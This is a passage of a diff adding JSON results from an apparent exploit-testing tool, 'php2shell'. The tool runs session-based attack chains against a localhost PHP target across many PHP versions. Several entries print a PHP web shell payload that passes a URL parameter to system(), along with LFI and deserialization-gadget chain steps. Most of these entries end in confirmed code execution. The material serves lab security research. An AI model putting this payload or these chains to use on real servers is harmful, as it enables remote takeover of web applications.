+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s02b7917c049c47f4c929d033\n[*] SID          : p2s02b7917c049c47f4c929d033\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2scfc9f358619d629cebcce\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se06b7adf9fff677a7087e\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.4.33",
+      "error": null
+    },
+    {
+      "php_version": "7.4.0-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2seafca385ac914d3bbd25c021\n[*] SID          : p2seafca385ac914d3bbd25c021\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc80534bbac4dd9b8700a1\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se456ca13480278e232607\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.4.0",
+      "error": null
+    },
+    {
+      "php_version": "7.3.33-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s26231b32fa3f9cdffd8efd0a\n[*] SID          : p2s26231b32fa3f9cdffd8efd0a\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc4e5ac2d580339de45e71\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se8eee79745602556d201d\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.3.33",
+      "error": null
+    },
+    {
+      "php_version": "7.3.0-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s6bc41a1d3dd999bc54fa085f\n[*] SID          : p2s6bc41a1d3dd999bc54fa085f\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc07fac7536acdee4b5d4b\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se59517fc3ece8e1035686\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.3.0",
+      "error": null
+    },
+    {
+      "php_version": "7.2.34-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s67e3fb6d025c06b3f1e14041\n[*] SID          : p2s67e3fb6d025c06b3f1e14041\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc30ade9d927db711b3371\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se6825390ab6e409949e77\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.2.34",
+      "error": null
+    },
+    {
+      "php_version": "7.2.0-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2sc0f227033cc60c08347d337f\n[*] SID          : p2sc0f227033cc60c08347d337f\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2scf5e07496ad0d9d00a99f\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2sefb82e8397f840e5458ea\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.2.0",
+      "error": null
+    },
+    {
+      "php_version": "7.1.33-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s85732d79a3717de49938cde1\n[*] SID          : p2s85732d79a3717de49938cde1\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2scd05107bb23bcf4426f5f\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2sedbff0a40fd29affafef0\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.1.33",
+      "error": null
+    },
+    {
+      "php_version": "7.1.0-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s5a17737f4762c069f6f8e16e\n[*] SID          : p2s5a17737f4762c069f6f8e16e\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc68a2ccc894ba015c4ad5\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se7f12750d6641a69cbba7\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.1.0",
+      "error": null
+    },
+    {
+      "php_version": "7.0.33-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2sfb4adf36ba2d3b6fb4625d4b\n[*] SID          : p2sfb4adf36ba2d3b6fb4625d4b\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2scadc2f747a9c78108e8fd\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2sec321c7d64c4b0569a6d0\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 7.0.33",
+      "error": null
+    },
+    {
+      "php_version": "5.6-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2sab3ce67d32b2bba50b71ef3c\n[*] SID          : p2sab3ce67d32b2bba50b71ef3c\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc1ee7a176f65f761d839c\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": false,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se97d1aaa42dc603957d17\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> gadget did not run\n       response: no output (gadget did not run)",
+          "uid": null,
+          "exit_code": 1
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 5.6.40",
+      "error": null
+    }
+  ],
+  "summary": {
+    "total_tested": 25,
+    "total_vulnerable": 25,
+    "total_patched": 0,
+    "total_pull_failed": 0,
+    "total_unreachable": 0
+  }
+}
